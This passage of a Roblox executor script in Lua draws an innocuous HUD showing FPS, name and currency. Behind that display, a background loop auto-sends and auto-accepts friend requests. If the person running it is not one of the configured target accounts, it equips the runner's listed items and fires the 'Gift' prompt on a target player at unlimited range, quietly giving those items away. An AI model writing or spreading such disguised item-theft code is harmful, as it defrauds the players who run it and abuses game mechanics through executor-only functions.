local frameCount, lastUpdate = 0, tick()
RunService.RenderStepped:Connect(function()
    frameCount = frameCount + 1
    local now = tick()
    if now - lastUpdate >= 1 then
        fpsLabel.Text = string.format("FPS: %d", math.floor(frameCount / (now - lastUpdate)))
        frameCount = 0
        lastUpdate = now
    end
    
    nameLabel.Text = LocalPlayer.Name
    if currencyStat then
        moneyLabel.Text = currencyStat.Name .. ": " .. formatNumber(currencyStat.Value)
    end
    
    local successVal, boostText = pcall(function()
        return LocalPlayer.PlayerGui.HUD.Currencies.FriendBoost.TextLabel.Text
    end)
    if successVal and boostText then
        boostText = string.gsub(tostring(boostText), "FRIEND BOOST", "Friend Boost")
        boostLabel.Text = boostText
    else
        boostLabel.Text = "N/A"
    end
end)

local sentRequests = {}

local function isValidTarget(username)
    return string.match(username, Config.TargetNamePattern) ~= nil
end

while task.wait(1) do
    if not enabled then
        if Config.AutoSendFriendRequest then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and not sentRequests[player.UserId] then
                    if isValidTarget(player.Name) then
                        local isFriend = false
                        pcall(function()
                            isFriend = LocalPlayer:IsFriendsWith(player.UserId)
                        end)
                        if not isFriend then
                            sentRequests[player.UserId] = true
                            pcall(function()
                                StarterGui:SetCore("PromptSendFriendRequest", player)
                            end)
                            task.wait(2)
                        else
                            sentRequests[player.UserId] = true
                        end
                    end
                end
            end
        end

        local isTargetPlayer = false
        for _, v in pairs(Config.TargetNames) do
            if LocalPlayer.Name == v then
                isTargetPlayer = true
                break
            end
        end

        if not isTargetPlayer then
            local targetPlayer = nil
            for _, name in ipairs(Config.TargetNames) do
                local p = Players:FindFirstChild(name)
                if p then
                    targetPlayer = p
                    break
                end
            end

            if Config.AutoGiveItems and targetPlayer then
                local character = LocalPlayer.Character
                local backpack = LocalPlayer:FindFirstChild("Backpack")
                if character and backpack then
                    for _, name in ipairs(Config.ItemList) do
                        local item = backpack:FindFirstChild(name)
                        if item then item.Parent = character end
                    end
                    local hrp = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local prompt = hrp and hrp:FindFirstChild("Gift")
                    local isHolding = false
                    for _, name in ipairs(Config.ItemList) do
                        if character:FindFirstChild(name) then
                            isHolding = true
                            break
                        end
                    end
                    if isHolding and prompt and prompt:IsA("ProximityPrompt") then
                        prompt.RequiresLineOfSight = false
                        prompt.MaxActivationDistance = 999999
                        fireproximityprompt(prompt)
                    end
                end
            end

            if Config.AutoAcceptFriend then
                local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                if playerGui then
                    for _, gui in ipairs(playerGui:GetDescendants()) do
                        if gui:IsA("TextButton") and (gui.Name == "AcceptButton") and gui.Visible then
                            if firesignal then
                                firesignal(gui.Activated)
                            elseif getconnections then
                                for _, con in pairs(getconnections(gui.Activated)) do
                                    con:Fire()
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end
